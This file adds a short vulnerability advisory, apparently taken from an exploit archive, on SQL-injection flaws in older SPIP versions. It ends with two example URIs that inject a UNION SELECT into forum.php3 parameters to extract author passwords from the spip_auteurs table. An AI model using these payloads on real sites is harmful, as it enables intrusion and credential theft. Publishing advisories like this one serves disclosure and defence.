@@ -1,0 +1,15 @@
+source: http://www.securityfocus.com/bid/16458/info
+
+SPIP is prone to multiple SQL-injection vulnerabilities. These issues are due to a failure in the application to properly sanitize user-supplied input before using it in SQL queries.
+
+Successful exploitation could allow an attacker to compromise the application, access or modify data, or exploit vulnerabilities in the underlying database implementation.
+
+Versions prior to and including 1.8.2-e and 1.9 alpha 2 are vulnerable; other versions may also be affected. 
+
+Example URIs have been provided:
+
+
+http://wwww.example.com/forum.php3?id_article=1&id_forum=-1/**/UNION/**/SELECT%20pass%20from%20spip_auteurs/*
+
+
+http://wwww.example.com/forum.php3?id_article=-1/**/UNION/**/SELECT%20pass%20from%20spip_auteurs/* 
